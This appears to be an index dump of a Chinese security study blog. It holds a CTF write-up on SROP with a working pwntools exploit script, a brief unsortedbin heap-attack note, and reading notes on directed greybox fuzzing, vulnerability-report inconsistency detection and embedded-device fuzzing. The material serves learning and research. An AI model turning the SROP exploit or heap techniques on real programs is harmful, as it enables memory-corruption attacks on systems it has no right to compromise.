15，执行停止程序。同时我们也可以看到 flag 的位置，那么我们需要利用 SROP 将该位置的 flag 输出。 如何利用 再看这两个 syscall：\n第一个 syscall 是 read 函数，此时的 edi 是 0，edx 是 0 x 400，rsi 是栈顶的值，根据 read 函数的参数和 Linux 函数调用约定可以知道，这意思是从标准输入读取0x400个字节到栈顶。 第二个 syscall 是 sigreturn，它会将栈中的数据按照 ucontext_t 结构恢复寄存器。 所以我们可以写入一个伪造的 sigreturn frame，让 sigreturn 恢复。 为了能够输出 flag，那我们伪造的 sigreturn frame 得是一个 write 函数的系统调用，系统调用号是0x1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 from pwn import * elf = ELF(\u0026#39;./funsignals_player_bin\u0026#39;) io = process(\u0026#39;./funsignals_player_bin\u0026#39;) # io = remote(\u0026#39;hack.bckdr.in\u0026#39;, 9034) context.clear() context.arch = \u0026#34;amd64\u0026#34; # Creating a custom frame frame = SigreturnFrame() frame.rax = constants.SYS_write frame.rdi = constants.STDOUT_FILENO frame.rsi = elf.symbols[\u0026#39;flag\u0026#39;] frame.rdx = 50 frame.rip = elf.symbols[\u0026#39;syscall\u0026#39;] io.send(bytes(frame)) io.interactive() 成功将 flag 输出。 ","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/ctf/pwn/srop/","summary":"SROP srop 的全称是 Sigreturn Oriented Programming。所以我们首先需要了解一下 Linux 的信号机制 signal 机制 如图所示，当有中断或异常产生时，内核会向某个进程发送一个 s","title":"SROP"},{"content":"定向灰盒模糊技术的进展、挑战与展望 作者：王鹏飞 单位：国防科技大学 国家： #中国 年份： #2021年 来源： #arxiv 关键字： #定向fuzzing #综述 总结笔记：[[The Progress, Challenges, and Perspectives of Directed Greybox Fuzzing 总结笔记]] [[The Progress, Challenges, and Perspectives of Directed Greybox Fuzzing.pdf]]\nPUT program under test DSE directed symbolic execution 定向符号执行 Abstract 定向灰盒相对于普通灰盒测试更高效 定向灰盒适用于补丁测试，bug再现，特殊bug检测等场景 本文从更广泛的角度研究DGF，它不仅考虑了针对特定代码部分的位置导向类型，而且还考虑了旨在暴露异常程序行为的行为导向类型。通过分析DGF研究的好处和局限性，我们试图找出当前研究中的差距，同时，揭示新的研究机会，并提出进一步调查的领域。 Introuction Greybox fuzzing is widely used to test application software and libraries [5, 6], as well as kernel code [7–9] and protocols[10-12]. testing software by blindly extending code coverage is less e fficient Originally, directed fuzzers were based on symbolic execution[14-17]. In 2017, B ̈ohme et al. introduced the concept of directed greybox fuzzing (DGF) [18].此时的定向模糊是需要手动标记targets，并且是基于种子和targets距离来进行能量分配 New fitness metrics, such as trace similarity and vulnerability prediction models（路径相似性和漏洞预测模型） Background CGF 旨在最大限度地提高代码覆盖率以发现隐藏的错误 AFL偏向于触发新路径的种子，并给予它们比非偏好路径的优先权。与其他仪器化的模糊器相比，AFL的性能开销不大。 CGF的效率偏低，因为努力被浪费在非bug区域 代表工具AFL 白盒定向fuzzing 代表工具：KLEE、KATCH、BugRedux 大多基于符号执行引擎实现 定向符号执行（DSE）使用程序分析和约束解算来生成输入，系统地、有效地探索可行路径的状态空间[15]。一旦确定了目标路径，就通过创建测试案例来探索路径约束的潜在解决方案。由于大多数路径实际上是不可行的，搜索通常通过寻找通往中间目标的可行路径来反复进行。 DSE的有效性是以效率为代价的。DSE的重量级程序分析和约束条件的解决是相当耗时的。 基于搜索的软件测试 基于搜索的软件测试(SBST)将软件测试问题转化为计算搜索问题，可以使用元启发式搜索技术进行优化，如爬坡、模拟退火和遗传算法[44]。 DGF 与盲目增加路径覆盖率的CGF不同，DGF的目标是到达代码中预先识别的一组位置（可能是有缺陷的部分），并将大部分时间预算用于到达目标位置 在编译时，除了仪器化，AFLGo还计算输入和预定义目标之间的距离。该距离被计算为执行轨迹到目标基本块的平均权重。执行跟踪权重由程序的调用图和控制流图中的边的数量决定。然后，在运行时，AFLGo根据距离而不是新的路径覆盖对种子进行优先排序，并优先考虑在基本块级距离上更接近目标的种子。 Methodology Inclusion and Exclusion Crieria（作者认为DGF的定义） 核心机制应当是灰盒模糊测试，关键步骤是种子优先级，能量调度，mutator调度 定向性应当体现在在关键步骤中对fitness metric的优化 fitness的目标是达到一个特定位置或触发程序的buggy行为 Data collection 从每篇论文中提取的数据将是：\n出版来源（即会议、期刊或预印本）和年份 fitness goal。达到什么样的目标站点（例如，易受攻击的功能）或暴露哪些目标bug？ 在模糊测试的进化过程中使用的fitness metric。例如，到目标的距离。 如何识别或标记目标？例如，由深度学习模型预测的。 实施信息。该模糊器是基于什么工具实现的？该模糊器是开源的吗？ 该工具是否支持二进制代码分析？ 该工具是否支持内核分析？ 该工具是否支持多目标搜索？ 该工具是否支持多目标优化？ 模糊处理中的哪些关键步骤被优化以实现定向性？即输入优化、种子优先级、功率调度、突变器调度和突变操作。 在优化过程中采用了哪些技术？即控制流分析、静态分析、数据流分析、机器学习、语义分析和符号执行。 Data Analysis 在最新的DGF研究中，目标识别方法是如何变化的？ 除了距离之外，在DGF的最新发展中，是否有任何新的fitness metric？ 最近的DGF工具是如何在模糊测试的关键步骤上进行优化的？ What are the challenges of the DGF research? Are there any potential solution？ DGF的典型应用是什么？如何为一个特定的应用场景选择一个DGF工具？ 未来DGF研究的趋势是什么？ Research Progress on Directed Greybox Fuzzing overview 设计新的fitness（UAFuzz, UAFL,LOLLY, Berry, CAFL.）或者实现mutil-dimensional fiteness（AFL-HR, HDRFuzz, AFLPro） 机器学习给targets自动打标签 SUZZER, V-Fuzz, De-Fuzz, SemFuzz；利用其他信息来给target打标签 DrillerGo, TortoiseFuzz, AFLChrun, GREYHOUND,DeltaFuzz, 1DVUL, SAVIOR, HDR-Fuzz. 借助数据流分析和语义分析来生成合法的输入，借助符号执行来通过复杂的限制，TOFU,TIFF, SemFuzz, KCFuzz, 1DVUL, SAVIOR. 利用启发式算法的AFLChrun, LOLLY, GREYHOUND 过滤无效输入 FuzzGuard, BEACON 检测具体的 bug 类型 MemLock, SlowFuzz, PERFFUZZ, MDPERFFUZZ. 局限性：费用扣除、等权度量偏差、勘探开发协调不灵活、源代码依赖、缺乏多目标优化、缺乏多目标协调等\nTarget Identification target locations 手动标注target location需要源码行号或者虚拟内存地址 辅助的元数据：git提交日志[19]中的代码变更，从bug跟踪[25]中提取的信息，CVE漏洞描述的语义[12,23,24]，或深度学习模型[27-29]，以帮助识别代码中的漏洞函数[23,24,27-29]，关键站点[71]，syntaxtoken[72]，完整性检查[30,73]，以及补丁相关分支[20,22] 静态分析工具可以自动的找到潜在的目标区域，一般这种工具只适用于特定的语言 编译sanitiser工具注释潜在的bugs 二进制级别的比较识别补丁相关分支 深度学习方法在二进制程序和抽象语法树级别预测潜在的脆弱代码 攻击面识别组件也被用来识别targets target bugs 利用target行为序列来识别漏洞 对于DGF类型的目标是特定的bug，不需要在PUT中标记目标，这意味着fuzzer可以自动识别并以进化的方式触发这些bug。 Fitness Metrics distance 这里提到的几篇论文可以看看 基于距离的方法的一个缺点是它只关注最短的距离，因此当有多个路径到达同一个目标时，可能会忽略较长的选项，从而导致差异 在计算基本块级别的距离时，需要花费相当多的时间 similarity 执行轨迹 hawkeye中首次提出，将基本块迹距离与覆盖函数相似度相结合，用于种子优先级和功率调度 Berry[77]同样是以执行轨迹的相似性作为衡量指标 相似度是某个度量的当前状态和目标状态之间的重叠程度，其中度量包括bug跟踪的长度，覆盖的位置、覆盖的操作或覆盖的函数的数量。 操作序列（程序行为？） UAFL[32]使用操作序列覆盖来指导测试用例的生成，以逐步覆盖可能触发释放后使用漏洞的操作序列。 UAFuzz[25]还使用一个序列感知的目标相似性度量来度量种子执行和目标释放后使用的错误跟踪之间的相似性。 SAVIOR[73]根据UBSan预测的标签覆盖[78]，优先考虑具有更高触发漏洞潜力的种子。 TortoiseFuzz[23]区分与敏感内存操作密切相关的边，并根据它们执行路径中的敏感边命中计数优先排序种子。 总的来说这部分的论文就是测量种子路径或者行为和能够达到targets的输入的路径或行为之间的相似度，相似度越高的种子得到更多的能量。 和distance相比 基于相似性的度量比基于距离的替代方法更能处理多目标拟合。 ^dfb282 基于距离的度量计算开销大，基于相似度的度量可以从相对较高的级别提取，以提高整体效率。 Vulnerability Prediction Models 利用基于深度学习的模型，可以预测函数的脆弱概率，并为脆弱函数中的每个基本块给出一个静态脆弱评分来衡量函数的脆弱概率。然后，对于每个输入，执行路径上所有基本块的静态脆弱得分之和被用作适应度得分，以优先考虑得分较高的输入[27,28]。 TAFL[76]提取PUT的语义度量，并使用静态语义度量来标记区域，包括敏感、复杂、深度和难以到达的区域，这些区域包含漏洞的概率更高，并加强了对这些区域的模糊处理。 Joffe[6]使用神经网络生成的崩溃可能性来指导模糊处理容易崩溃的执行。基于概率的度量可以将种子优先级与目标识别结合起来，在不依赖源代码的情况下将模糊定位指向潜在的脆弱位置。 深度学习的方法目前的一个主要缺点是精度在一定程度上受到限制。 other W ustholzet al[68]使用在线静态前瞻分析来确定一个路径前缀，该路径前缀的所有后缀路径都不能到达目标位置。然后，通过战略性地调度模糊的能量来强调可能到达目标位置的路径前缀来启用定向模糊。 KCFuzz[71]将目标路径中的父节点定义为关键点，并使用关键点覆盖来指导模糊处理。 CAFL[84]旨在满足一系列约束(即目标站点和数据条件的组合)，而不是达到一组目标站点。它将约束的距离定义为一个给定的种子满足约束的程度，并按顺序优先考虑更好地满足约束的种子。 AFL-HR[81]和HDR-Fuzz[85]采用了一种面向漏洞的适应度度量，称为净空(headroom)，它表明测试输入在给定漏洞位置暴露难以显示的漏洞(例如，缓冲区或整数溢出)的密切程度。 PERFFUZZ[34]使用所有程序位置的执行计数的新最大值作为反馈来生成病态输入。为了系统地度量适应度，定制的适应度度量还同时考虑多个维度，包括基本代码覆盖率、块权重、状态转换数量、执行时间、异常计数等等[12,86]。 此外，非功能性属性，如内存使用[31]和机器人车辆的控制不稳定性[33]也可以用来指导模糊。 Fuzzing Optimization 71%依靠控制流分析来评价种子和确定对目标的可达性 60%利用静态分析自动识别目标[73]，并从PUT中提取信息[67,68] 21%的人使用数据流分析(主要污染分析)来识别输入和关键程序变量之间的关系[20,87,88]或优化仿真器调度[32] 12%的人使用机器学习来预测易受攻击的代码[27]并过滤掉不可达的输入[89] 12%的人集成符号(concolic)执行来解决复杂的路径约束[20,24,73,77]; 14%采用语义分析自动**识别脆弱目标[19,24,76]，学习输入字段语义进行优化。 input optimization 好的seed input应该可以促使fuzzing进程靠近targets，并且提升稍后的变异进程的性能 AFLGO有91.7%的输入不能到达buggy code 可以用动态污点分析和语义信息来构建合法的输入 FuzzGuard利用深度学习方法来预测和过滤输入 BEACON[90]使用轻量级静态分析剔除不可行的路径(即在运行时无法到达目标代码的路径 seed prioritization DGF的核心是对最接近targets的种子(用于突变)进行优先排序 种子优先级的排序主要基于控制流分析 基于距离的方法[18,20,25,30,67,69,70]从PUT的调用和控制流图中的边数计算到目标基本块的距离。 基于相似性的方法[23,25,32,77,83]将种子覆盖控制流图上目标边的能力作为评估种子的度量。 基于预测模型的方法[27,28]也依赖于有属性的控制流图(即使用数值向量来描述控制流图中的基本块，其中向量的每个维度表示基本块的特定属性的值)来表示二进制程序并提取用于深度学习的特征。 定向混合模糊[20,24,71,73,77]结合了DSE的精度和DGF的可伸缩性，以减轻它们各自的弱点。DGF可以对输入突变进行优先排序和调度，从而快速接近目标，而DSE可以通过解决复杂的路径约束来实现更深入的代码。 power scheduling 定向灰盒大多采取的都是模拟退火算法，模拟退火算法有一定概率会采用比当前种子效果差的种子，这样可以跳出局部最优解，得到全局最优解。 AFLGo[18]是第一个使用模拟退火为基础的功率计划，逐步将更多的能量分配给更接近目标位置的种子，同时减少距离较远的种子的能量。 Hawkeye[67]在模拟退火中增加了优先级，允许更接近目标的种子先突变。 AFLChurn[22]提出了一种基于蚁群优化的字节级功率调度，可以将更多的能量分配给产生更多“有趣”输入的字节。 LOLLY[83]和Berry[83]优化了基于模拟退火的功率计划，并设置了温度阈值，以协调勘探和开发阶段的冷却计划。在探索阶段，cooling schedule对提供的种子进行随机突变，生成较多的newinput，而在开发阶段，cooling schedule 从序列覆盖率较高的种子中生成较多的newinput，这与传统的梯度下降算法相似[83]。 除了模拟退火，GREYHOUND[12]还采用了自定义分代粒子群算法，更适合于协议模型的非线性和随机行为。 mutator scheduling 优化突变策略是改进定向模糊的可行方法。合理调度突变子可以提高种子突变的精度和速度，提高输入的方向性。 可行的方法是首先将突变子划分为粗粒度和细粒度[19,27,67,76]，然后根据实际模糊状态动态调整。粗粒度突变器用于在突变期间改变大量字节，以将执行移向“易受攻击的函数”，而细粒度突变器只涉及一些字节级的修改、插入或删除，以监控“关键变量”[19] 在实践中，突变子的调度由经验值控制[27,67]。Situ等人[76]给出了两个经验观察结果:(1)粗粒突变子在路径生长上优于细粒突变子;(2)与单个突变相比，多个突变的使用提供了更好的性能。 mutation operations 数据流分析，如污点分析，可以反映突变在生成的输入中的影响，因此，它有助于优化突变操作和输入生成。 RDFuzz[69]利用扰动-检查方法从输入中识别和保护“距离敏感内容”，即关键内容，以保持输入与目标之间的距离，一旦改变，距离就会变大。在突变期间保护这些内容可以帮助更有效地接近目标代码位置。 UAFL[32]采用信息流分析来识别条件语句中输入与程序变量之间的关系。它将对目标语句值改变可能性越大的输入字节视为“信息流强度”越高的输入字节，并赋予其更高的突变可能性。信息流强度越高，该字节对变量值的影响越强。 SemFuzz[19]通过反向数据流分析跟踪关键变量所依赖的内核函数参数。 TIFF[88]通过基于类型的突变来推断输入类型，以增加触发内存损坏漏洞的概率。它利用内存中的数据结构识别来识别应用程序使用的每个内存地址的类型，并使用动态污染分析来映射输入字节最终在哪些内存位置。然而，数据流分析通常会增加运行时开销。 ChallengesFaced by Directed Greybox Fuzzing Performance Deduction 额外的仪器和数据分析使得fuzzing的性能下降，优化效率是提高方向性的主要挑战。 解决方案： 将繁重的与执行无关的计算从运行时移到编译时。 在执行前过滤掉目标无法到达的输入。 使用更轻量级的算法。 利用并行计算。 Equal-weighted Metrics Bias Seed Prioritization 等加权指标偏差种子优先级 在大多数最先进的定向灰盒模糊器中，种子优先级是基于等加权指标的，即，将控制流图中的每个分支跳视为具有等概率。，这样的测量忽略了不同的分支跳跃有不同的概率，因此，偏差了定向模糊的性能。 一种常见的情况是A→C表示错误处理代码的执行路径。错误处理代码通常简短，用于检索资源，例如释放分配的内存。因此，从错误处理代码到目标的执行路径通常距离很短(例如，一跳)。然而，由于很少执行错误处理代码，这样的执行路径的概率很低。如果我们只考虑距离，错误处理代码的路径就会被过分强调，我们就会忽略容易出现错误的常规代码，从而导致偏差。 一种解决方案是考虑分支跳转概率，构建加权适应度指标。在这种情况下，每个seed的优先级是根据将当前执行路径转换为经过目标的目标路径的概率来确定的。因为一个执行路径可以被看作是一个连续分支[1]的马尔可夫链，路径概率可以通过收集路径内所有分支的概率来计算。然后基于蒙特卡罗方法[23]，通过计算分支概率的比值，可以统计地估计分支概率。由于模糊处理的随机性和高通量，满足了蒙特卡罗方法对随机大采样的要求。因此，分布密度可以以轻量级的方式形式化地估计分支跳转概率。 基于概率评估目标可达性的一个可能的缺点是潜在的运行时开销。统计跳变计数和概率计算都引入了额外的计算量。缓解性能下降的一种方法是间隔抽样。通过适当的采样来压缩跳跃统计量，可以加快概率计算的速度，减轻存储空间的需求。另一种方法是加快跳跃统计数据的存储和访问方式。一方面，基于概率的方法经常更新跳跃统计数据，可达性判断也需要快速跟踪。另一方面，由于跳跃通常只有两个分支，数据分布(例如基于矩阵)将是相对稀疏的，这将极大地增加空间消耗。因此，需要一个自定义的数据结构来平衡时间和空间的复杂性。 Global Optimum Discrepancy in the Distance-based Metric 基于距离的度量的全局最优差异 当使用基于距离的度量度量多个目标时，采取的策略是寻求所有目标的全局最短路径，然而这种全局最优可能会错过最接近特定目标的局部最优种子，从而导致差异。 举例的这个例子我没看懂，既然L不是目标，那第三个种子应该最开始就被排除，怎么还计算路径距离和别的种子比较呢？ 造成这种差异的原因是基于距离的种子测量只关注最短路径。当有多条路径到达同一目标时，较长的路径可能被忽略，导致结果不一致。 在满足以下三个条件时，这种差异是现实的，并且经常发生:(1)多个目标按距离测量;(2)至少一个目标具有多条可行路径;(3)种子沿着较长的路径运动，用这个距离来衡量。多目标测试是应用DGF时经常使用的场景。例如，通过将代码更改设置为目标来测试补丁。因此，条件1)很容易满足。对于条件2)，我们也使用错误处理代码作为示例。错误处理代码可以是许多功能模块的目标，这意味着错误处理代码中的目标通常可以通过许多路径到达，因此条件2)也很容易满足。最后，条件3)的满足是不确定的，因为我们不能保证较长的路径被行使。只有当种子运动的路径较长时，才用这个距离来衡量，就会出现不一致。（没看懂） 为了避免这种差异，必须考虑到到达目标的所有可能路径。例如，在不同的上下文中，从调用函数到立即调用函数的距离可能不完全相同。为了解决这个问题，Hawkeye使用基于轻量级静态分析的“邻接函数距离增强”[67]，该方法基于生成的调用图考虑(即时)调用关系的模式，以增强由呼叫方和被呼叫方之间的即时调用关系定义的距离。协调多目标的另一个策略是分离目标。对于每个种子，只有所有目标的最小距离被选择为种子距离，并且种子的优先级基于这个最小距离[20]。这样做的结果是否定了偏向全局最优解的可能性，但代价是增加了达到给定目标所需的时间。 Inflexible Coordination of Exploration Phase and Exploitation Phase 勘探阶段和开发阶段的不灵活协调 DGF的另一个挑战在于协调勘探与开发之间的权衡。一方面，要加大勘探力度，为开发提供充分的信息;另一方面，过度勘探会占用大量资源，延误开发。确定勘探阶段与开发阶段的界限以获得最佳开采效果是一项困难的工作。\n这块没什么人做，在调查的定向模糊器中，只有一项工作是优化勘探开发协调。 RDFuzz[69]结合距离和频率来评估输入。在探索阶段需要低频输入以提高覆盖范围，而在开发阶段则倾向于短距离输入以实现目标代码区域。最后采用相互缠绕的试验计划，进行勘探与开发交替进行。然而，对四种输入类型 (短/长、低频/高频) 的分类是初步的，其性能在很大程度上取决于经验阈值。 2020usenix 的 EcoFuzz 解决了该问题 Dependence on the PUT Source Code 大多数已知的DGF工作需要源代码，它不适合测试源代码不可用的场景，例如商业现货(COTS)软件，或者部分依赖于第三方库的安全关键程序。 在二进制层次上阻碍dgf应用的原因有很多。 首先，沉重的运行时开销。二进制级测试的直接解决方案是通过全系统模拟器，例如QEMU[25]。然而，基于模拟器的工具通常效率较低。 减轻性能限制的可行解决方案是硬件辅助，例如英特尔处理器跟踪(PT)。Intel PT是Intel处理器中的轻量级硬件特性。它可以动态地跟踪程序执行，开销几乎可以忽略不计(平均比QEMU-AFL快4.3倍[94])，从而取代了对动态检测的需求。利用Intel PT捕获的数据包跟踪和相应的PUT二进制文件，可以完全重构PUT的执行路径。有人尝试用pt进行模糊[7,93 - 95]，但从未用于DGF。 二是目标信息收集困难。开源PUT可用于从各种渠道获取目标信息，例如cvevulvulnerability描述[23,24]，gitcommit日志[19]中的更改，以及源代码中关键站点上的人类经验。然而，对于二进制代码，我们只能从bug跟踪[25]中提取目标信息。 三是目标定位困难。对于源代码检测方法，目标可以基于源代码进行标记(例如。， cxxfilt.c，第100行)。然而，对于二进制来说要困难得多。由于二进制代码很难读取，它必须使用IDA Pro[25]等工具进行分解，并使用虚拟地址标记目标，这既不方便又耗时。 对于二进制代码级别的目标识别和标记问题，可以利用基于机器学习的方法[27,28]和启发式二进制差分方法[73]来自动识别脆弱代码 Application of DirectedGreyboxFuzzing patch testing bug reproduction knowledge integration result validation energy saving dgf的另一个有趣的应用是在测试资源有限的情况下。例如，当模糊物联网设备。在这种情况下，识别关键代码区域来指导测试比以无导向的方式测试整个程序更有效，这可以节省时间和计算资源花在没有bug的代码区域上。GREYHOUND[12]和RVFUZZER[33]分别为Wi-Fi客户端和机器人车辆设计，均适用于此场景。 Special bug detection. Perspectives on Future Trends Exploitation of Relationship between Targets 当目标模糊化任务中存在多个目标时，如何协调这些目标是另一个挑战。对于要达到的多个目标，挖掘目标之间的关系对优化dgf具有重要意义。如果目标是不相关的，可以给它们分配权重，以区分重要性或概率。或者，可以提取和利用隐藏的关系来提高方向性。 在此，我们建议在dgf研究中可以考虑以下关系。 空间关系。即目标在执行树上的相对位置。考虑两个目标之间的关系，包括它们是否占用同一个分支、共享执行的级别以及它们的相对优先级(如果有的话)。 交错的关系。对于多线程程序，线程调度也会影响不同线程中事件的执行顺序。同一线程交错下可达到的目标在交错空间中应具有密切的关系。 Design Multi-dimensional Fitness Metric 目前的模糊方法主要集中在路径层面的覆盖，这忽略了即使执行脆弱的代码，一些bug也不会被触发或显示的事实。为了检测这种“难以显示”的漏洞，适应度度量必须扩展为多维度，例如状态空间。 例如，只有当缓冲区访问指针指向缓冲区之外时，缓冲区溢出漏洞才会在缓冲区访问位置显示。类似地，只有当被递增的变量具有足够大的值时，才会在编程位置观察到整数溢出漏洞。 状态空间是一个值得与漏洞位置的可达性一起考虑作为适应度度量的维度。在实践中，大多数基于模糊的方法只在执行某些代码时取得进展，忽略了状态机的更新。然而，有些漏洞可能只有某些到达漏洞点且状态正确的执行才可能表现出脆弱行为。为了暴露这种漏洞，我们需要输入不仅能到达漏洞位置，而且还能匹配脆弱状态[81]。 Multi-objective Optimization 多目标优化比只能实现一个目标的传统策略更有优势。它制定了多个属性之间的权衡，如可用性和安全性[100]。例如，多目标优化可以生成覆盖特定目标的测试集，同时最大限度地提高总体覆盖率，或者优先考虑覆盖尽可能多的软件的测试，同时最大限度地减少测试运行[45]所需的时间。多目标搜索的结果是一组帕累托最优解，其中对于所有目标[45]，集合中的每个成员都不比其他任何成员更好。 优化多个目标的一般解决方案是协同进化，其中两个(或多个)测试输入群体使用它们自己的适应度函数以合作的方式同时进化[101]。 Target for New Domains 内核测试 在评估的工具中，只有一个(SemFuzz[19])支持内核代码测试。因此，在内核代码中引入DGF，并在关键位置(如系统调用和错误处理代码)引导模糊处理来发现内核错误应该是一个有效的方向。 协议测试 定向测试可以加强协议消息的关键字段，例如消息长度和控制信息。Zhuet等[103]利用dgf通过目标和执行间接跳转来构建更完整的控制流图。 将DGF应用于具有特定特征的bug类型 感兴趣的 机器学习fuzz “ such as by machine learning [27–29]” hawkeye[67] 利用基于深度学习的模型，可以预测函数的脆弱概率，并为脆弱函数中的每个基本块给出一个静态脆弱评分来衡量函数的脆弱概率。然后，对于每个输入，执行路径上所有基本块的静态脆弱得分之和被用作适应度得分，以优先考虑得分较高的输入[27,28]。 metric那里的论文其实都可以看看 FuzzGuard [89]utilizes a deep-learning-based approach to predict and filterout unreachable inputs before exercising them BEACON[90]使用轻量级静态分析剔除不可行的路径(即在运行时无法到达目标代码的路径)，可以拒绝在模糊处理期间执行的80%以上的路径 对于分支概率这方面好像没什么论文 dgf的另一个有趣的应用是在测试资源有限的情况下。例如，当模糊物联网设备。在这种情况下，识别关键代码区域来指导测试比以无导向的方式测试整个程序更有效，这可以节省时间和计算资源花在没有bug的代码区域上。GREYHOUND[12]和RVFUZZER[33]分别为Wi-Fi客户端和机器人车辆设计，均适用于此场景。 ","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/the-progress-challenges-and-perspectives-of-directed-greybox-fuzzing/","summary":"定向灰盒模糊技术的进展、挑战与展望 作者：王鹏飞 单位：国防科技大学 国家： #中国 年份： #2021年 来源： #arxiv 关键字： #定向fuzzing #综述 总结","title":"The Progress, Challenges, and Perspectives of Directed Greybox Fuzzing"},{"content":"具体内容可看 [[The Progress, Challenges, and Perspectives of Directed Greybox Fuzzing]]\n术语缩写 ： PUT program under test DSE directed symbolic execution 定向符号执行 DGF 现在的一些研究方向（内容）： 设计新的 fitness 距离 相似度（比距离有优势）![[The Progress, Challenges, and Perspectives of Directed Greybox Fuzzing#^dfb282]] 脆弱性预测模型（脆弱概率）（目前精度不高） 实现多维度的 fitness 协调（感觉这个是比较好做的方向，堆料就行） 使用启发式算法来处理能量分配（本质上是在做优化，AFLgo 里面的模拟退火） Targets 预测 可以从代码位置和程序行为两方面入手 生成合法输入、或者过滤无效输入 动态污点分析 语义信息 深度学习 静态分析 变异策略 符号执行解决复杂约束 检测 bug 类型 前四项应该是属于 DGF 的特定任务，1-2 希望得到更有效的 fitness，3 希望能优化 fitness 的计算算法，第四项其实和 fitness 密切相关，往往 fitness 就是 targets 确定方法的一个量化。 而后几项感觉算是 fuzzing 研究通用的问题，主要是用来优化 fuzzing，提高 fuzzing 的效率 挑战 Fuzzing 性能下降，因为 DGF 有一些额外的处理 预处理 并行计算 提前过滤无效输入 轻量级算法 更加细粒度的调控 等加权指标偏差种子优先级 [[The Progress, Challenges, and Perspectives of Directed Greybox Fuzzing#Equal-weighted Metrics Bias Seed Prioritization 等加权指标偏差种子优先级]] 基于距离的度量的全局最优差异 勘探阶段和开发阶段的不灵活协调（EcoFuzz 解决了该问题） 过于依赖源代码（或者说二进制层次上的测试难以开展） 硬件辅助模拟 机器学习和启发式二进制差分法来识别 targets 应用 patch testing bug reproduction knowledge integration result validation energy saving dgf 的另一个有趣的应用是在测试资源有限的情况下。例如，当模糊物联网设备。在这种情况下，识别关键代码区域来指导测试比以无导向的方式测试整个程序更有效，这可以节省时间和计算资源花在没有 bug 的代码区域上。GREYHOUND[12]和 RVFUZZER[33]分别为 Wi-Fi 客户端和机器人车辆设计，均适用于此场景。 Special bug detection. 这部分启示性不大\n未来趋势 多 targets 协调 多维度 fitness 多目标优化 DGF 应用到其他领域（内核、协议等等） ","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/3.%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/the-progress-challenges-and-perspectives-of-directed-greybox-fuzzing-%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/","summary":"具体内容可看 [[The Progress, Challenges, and Perspectives of Directed Greybox Fuzzing]] 术语缩写 ： PUT program under test DSE directed symbolic execution 定向符号执行 DGF 现在的一些研究方向（内容）： 设计新的 fitness 距离 相似度（比距离有优势）![[","title":"The Progress, Challenges, and Perspectives of Directed Greybox Fuzzing 总结笔记"},{"content":"中文译名：浅谈公共安全漏洞报告不一致的检测 作者：Ying Dong 单位： 国科大 国家： #中国 年份： #2019年 来源： #USENIX会议 关键字： #提取信息 代码地址：pinkymm/inconsistency_detection: Towards the Detection of Inconsistencies in Public Security Vulnerability Reports (github.com) 笔记建立时间： 2023-05-15 14:53\nAbstract we propose an automated system VIEM to detect inconsistent information between the fully standardized NVD database and the unstructured CVE descriptions and their referenced vulnerability reports. VIEM is developed to extract vulnerable software names and vulnerable versions from unstructured text. We introduce customized designs to deep-learning-based named entity recognition (NER) and relation extraction (RE) so that VIEM can recognize previous unseen software names and versions based on sentence structure and contexts. Design Named Entity Recognition Model use a state-of-the-art NER model to identify the entities of interest, i.e., the name and version of the vulnerable software those of vulnerable components and those of underlying software systems that vulnerable software depends upon.\nuse a standard word embedding approach to encode tach word as a vector representation use Bi-GRU to perform text encoding at the character level. use other Bi-GRU to assign label to every word : SN for software name, SV for software version, O for other build a dictionary consisting of 81,551 software to rectify the result of NER model. Relation Extraction Model utilizes a Relation Extraction (RE) model to pair identified entities accordingly\nstep 1: encodes the occurence of the SN and SV, and then yields a group of position embeddings representing the relative distances from current word to the two named entities in the same sentence. step 2: use the same way as the NER to generate the embedding, then right behind the word embedding, the RE model appends each group of the position embeddings individually. step 3: each pair of word embedding and position encoding through a attention netword and then use other attention netword to predicts which pair is true. Transfer Learning learns the aforementioned NER and RE models using vulnerability reports in one primary category and then transfers their capability into other vulnerability categories\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/towards-the-detection-of-inconsistencies-in-public-security-vulnerability-reports/","summary":"中文译名：浅谈公共安全漏洞报告不一致的检测 作者：Ying Dong 单位： 国科大 国家： #中国 年份： #2019年 来源： #USENIX会议 关键字： #提取信","title":"Towards the Detection of Inconsistencies in Public Security Vulnerability Reports"},{"content":"(72条消息) 堆漏洞挖掘——unsortedbin attack漏洞_unsorted bin attack_董哥的黑板报的博客-CSDN博客 ubsortedbin attack是用来配合 [[fastbin attack]] 的。 ubsortedbin attack是双向链表，所以系统会将我们伪造的fake chunk的fd和bk都指回unsortedbin链，而这个地址肯定是0x7f开头的大数值，所以就在目标地址处写入了0x7f。\n","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/ctf/pwn/unsortedbin-attack/","summary":"(72条消息) 堆漏洞挖掘——unsortedbin attack漏洞_unsorted bin attack_董哥的黑板报的博客-CSDN博客 ubsortedbin att","title":"unsortedbin attack"},{"content":"你破坏的不是你破坏的: Fuzzing 嵌入式设备的挑战 作者：Marius Muench 单位：巴黎高等电信学院 国家： #法国 年份： #2018年 来源： #NDSS会议 关键字： #嵌入式 #综述 [[What You Corrupt Is Not What You Crash_ Challenges in Fuzzing Embedded Devices.pdf]]\nAbstract 传统的测试方法依赖于程序中看的见的崩溃, 而二进制插装技术是用来改善针对这些缺陷状态的检测方法 演示了 memory corruption 漏洞，展示 embedded devices 和 desktop systems 的不同 分析了几种 embedded devices 设备的差异 Introduction Memory corruption 导致的漏洞普遍存在，模糊测试是发现这些漏洞最流行的技术之一，适合大规模自动化 因为 embedded devices 的有限的 I/O 和计算能力，受限的成本，其上没有大部分 desktop systems 拥有的防御机制，所以发生内存损坏的概率更高 但是 embedded devices 存在缺少源码，识别 memory corruption 的传统方法不适用于的问题。 本文首次全面分析了内存损坏对不同类别的嵌入式系统的影响，并且提出的技术可以 100%检测到在模糊过程中触发的内存损坏状态 FUZZING EMBEDDED SYSTEMS 